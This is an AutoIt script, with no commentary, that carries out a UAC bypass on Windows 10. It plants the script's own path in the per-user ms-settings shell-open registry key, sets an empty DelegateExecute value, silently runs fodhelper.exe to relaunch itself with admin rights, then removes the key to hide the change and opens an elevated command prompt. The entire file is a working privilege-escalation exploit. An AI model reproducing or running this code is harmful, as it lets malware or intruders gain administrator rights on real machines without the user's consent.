#NoTrayIcon

If @OSVersion <> "WIN_10" Then
  MsgBox(16,"Error","Only Win10 is supported")
  Exit(0)
EndIf

If @AutoItX64 Then
  $bin =  "cmd.exe"
Else
  $bin = @WindowsDir & "\Sysnative\cmd.exe"
EndIf

If IsAdmin() Then
  $a = MsgBox(1,"Admin","Click OK to open elevated CMD prompt")
  Switch $a
    Case 1
      Run(@ComSpec)
    Case 2
      Exit(0)
  EndSwitch
  Exit(0)
EndIf

RegDelete("HKCU\Software\Classes\ms-settings\Shell\Open")

$rKey = "HKCU\Software\Classes\ms-settings\Shell\Open\command"
$payload = @ScriptFullPath

RegWrite($rKey, "", "REG_SZ", $payload)
If Not @error Then RegWrite($rKey, "DelegateExecute", "REG_SZ", "")
If Not @error Then
  RunWait($bin & " /c fodhelper.exe", @SystemDir, @SW_HIDE)
  RegDelete("HKCU\Software\Classes\ms-settings\Shell\Open")
EndIf
